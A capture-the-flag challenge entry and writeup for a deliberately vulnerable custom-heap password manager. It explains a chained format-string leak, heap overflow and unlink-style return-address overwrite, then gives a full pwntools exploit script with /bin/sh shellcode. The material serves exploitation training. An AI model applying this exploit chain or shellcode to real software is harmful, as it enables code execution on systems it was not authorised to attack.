# Name
Password Manager

# Description
I programmed my own open-source password manager, and it is completely unhackable! I even made my own custom heap implementation to secure myself against heap exploitation attempts! I don't care how good of a hacker you are, even with my source code, you won't be able to open up a shell in my program!

TODO: Put a netcat command here telling them which server to connect to in order to test the exploit.

# Difficulty
7/10

# Flag
I haven't programmed a flag into this yet. Basically, after they exploit the program, they should get a shell into the server running this program. There should be a flag.txt file on that server in the same directory as the program, which they should be able to cat. Whoever is setting up this server can just put whatever they want into the flag.txt file and have that be the flag.

# Hints
None

# Author Name
Nihaal Prasad

# Writeup
The user is given four files: alloc.c, alloc.h, passwd.c, and password. If they execute the password file, they should see the following printed out:

```
Hello, welcome to the world's greatest password manager!
This password manager is so amazing that it uses a custom
heap implementation! No hacker will ever be successful in
conducting a heap overflow against this application (let
alone ever obtain a shell)! It is impossible to hack into
this application, so you shouldn't even bother trying!

To create a new account, please enter a username: 
```

After typing in a username, the program gives the user the option to add, delete, modify, and print out passwords.
```
To create a new account, please enter a username: Nihaal
A new account for Nihaal has been created.

Available commands:
new: Create a new password.
print <id>: Prints out the password with the given ID.
del <id>: Deletes the password with the given ID.
modify <id>: Modifies the password with the given ID.
quit: Stop the program.
> 
```

There are multiple vulnerabilities here that must be chained together for the exploit to work. If you look in passwd.c, you can see the a format string vulnerability in the print_pass() function
```
void print_pass(pass_t *n) {
        printf("Password #%ld\n", n->id);
        printf(n->pass);
}
```

If you immediately create a new password with "%8$p" as its string, then when you print out the password, you'll get the eighth pointer from the stack. Adding 208 to this address gives us the address of our username (where we'll put in our shellcode). Subtracting 40 from this address gives us the address of the return address for heap_alloc(), which will be helpful later.

```
void modify_id(unsigned long id, pass_t *head) {
        pass_t *tmp = head;
        while(tmp != NULL && tmp->id != id) {
                tmp = tmp->next;
        }
        if(tmp != NULL) {
                printf("Enter the modified password (%d max characters): ", BUF_SIZE);
                fgets(tmp->pass, 1000, stdin);
        } else {
                printf("Invalid ID.\n");
        }
}
```

The modify\_id() function in passwd.c contains the second vulnerability. This function can move up to 1000 bytes into tmp->pass. If you look into the definition of `pass_t`, you'll see that it contains a 128-byte array, two pointers, and a long, which makes a single `pass_t` variable 152 bytes long. Therefore, if you modify a password and type in more than 152 bytes, you will be able to do a heap overflow.

```
typedef struct pass {
        char pass[BUF_SIZE];
        struct pass *next;
        struct pass *prev;
        unsigned long id;
} pass_t;
```

If we look into the definition of a `heap_header_t`, we'll see that there are four variables: `next`, `prev`, `size`, `free`. If we use the `modify_id()` function to conduct a heap overflow, then we should be able to overwrite all four of these values in the adjacent heap chunk. In other words, we can completely control the header of the chunks that comes right after the chunk we are currently writing to.

```
typedef union heap_header {
    struct {
        union heap_header *next;
        union heap_header *prev;
        size_t size;
        char free;
    } data;
    char align[32];
} heap_header_t;
```

Now look at the `heap_alloc()` function in alloc.c to find the main vulnerability that makes obtaining a shell possible. Suppose someone called `heap_alloc()`, and there is a free chunk that already exists. The following steps will occur in this situation:
1. `heap_alloc()` will call `first_fit()` to search for a free chunk.
2. It will then remove the free chunk from the linked list of free chunks.
3. It mainly uses a couple lines of code to accomplish this, which are shown below:
```
if(ret->data.prev) {
    ret->data.prev->data.next = ret->data.next;
}
if(ret->data.next) {
    ret->data.next->data.prev = ret->data.prev;
}
```
These lines of code are used to remove the free chunk from the linked list of free chunks. However, consider the fact that we can control the values of `data.next` and `data.prev` (if it comes right after a chunk we can write to). If we were to overwrite the value of `data.next` with the address of the return address of `ncha_alloc()`, then the return address would be set equal to `data.prev`. If we set `data.prev` to the address of our username, then we can just set our username to our shellcode and obtain code execution in that manner!

To accomplish this, we will create three new passwords. Then, we'll delete the second password. Next, we'll modify the first password and overwite the header of the second heap chunk. If done correctly, we will immediately obtain code execution when we create a fourth password. Here is some python code that does just that:

```
#!/usr/bin/env python3

from pwn import *

# Open the process
p = process("./password", stdin=PTY)
# gdb.attach(p, "b heap_alloc\nc")

# Ignore the intro
p.recvuntil("please enter a username:")

# Send the shellcode as our name
shellcode = b"\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05"
shellcode = (b"\x90"*(126-len(shellcode))) + shellcode
p.sendline(shellcode)

# Ignore the other shit
p.recvuntil("> ")

# Leak an address from the stack
p.sendline("new") # Create a new chunk on the heap
p.sendline("%8$p") # Eighth value on the stack is what we want
first_password_id = p.recvline()[67:-2] # Get the first password's ID
p.sendline(b"print " + first_password_id) # Print out the password
p.recvline() # ignore a line
leaked_addr = int(p.recvline(), 16) # Leak the address on the stack
shellcode_addr = p64(leaked_addr + 208) # Shellcode is 208 bytes away from the leaked address
return_addr = p64(leaked_addr - 40) # Address of return address is 40 bytes away

# Create two more passwords
p.sendline("new")
p.sendline("AAAAAAAA")
second_password_id = p.recvline()[69:-2]
p.sendline("new")
p.sendline("BBBBBBBB")
p.recvline() # Ignore this line, we don't need it

# Deallocate the second password to create a free chunk on the heap
p.sendline(b"del " + second_password_id)

# Generate a payload that will corrupt a chunk on the heap
payload = b"A"*152
payload += shellcode_addr
payload += return_addr
payload += b"\xff\xff\xff\xff\xff\xff\xff\xff\x01"

# Save the payload to the first password so that it corrupts the second chunk
p.sendline(b"modify " + first_password_id)
p.sendline(payload)

# When a new node is created, it will use the next free chunk.
# Since the free chunk is corrupted, this will trigger a heap overflow.
p.sendline("new")
p.interactive()
```
